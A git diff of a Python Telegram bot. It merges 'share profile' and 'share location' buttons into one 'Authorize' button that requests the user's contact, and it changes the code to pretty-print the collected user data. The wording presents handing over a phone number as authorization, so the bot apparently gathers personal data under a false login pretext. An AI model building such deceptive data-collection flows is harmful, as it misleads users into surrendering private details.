@@ -1,5 +1,6 @@
-import telebot
 from telebot import types
+import telebot
+import json
 import confs
 
 bot = telebot.TeleBot(confs.TOKEN)
@@ -50,11 +51,10 @@ def start(message):
         reply_markup=keyboard
     )
 
-def send_contact_location_keyboard(chat_id, text="Вы не авторизованы! Предоставьте доступ:"):
+def send_contact_location_keyboard(chat_id, text="Вы не авторизованы, предоставьте доступ:"):
     keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
-    btn1 = types.KeyboardButton("📱 Предоставить профиль", request_contact=True)
-    btn2 = types.KeyboardButton("📱 Предоставить доступ", request_location=True)
-    keyboard.add(btn1, btn2)
+    btn = types.KeyboardButton("🔐 Авторизоваться", request_contact=True)
+    keyboard.add(btn)
     bot.send_message(chat_id, text, reply_markup=keyboard)
 
 @bot.message_handler(content_types=['contact', 'location', 'text'])
@@ -82,8 +82,8 @@ def handler(message):
         },
         "avatar_file_id": avatar_file_id,
     }
-    
-    print(data)
+
+    print("[USER DATA]", json.dumps(data, ensure_ascii=False, indent=4))
 
 @bot.callback_query_handler(func=lambda call: True)
 def callback_handler(call):
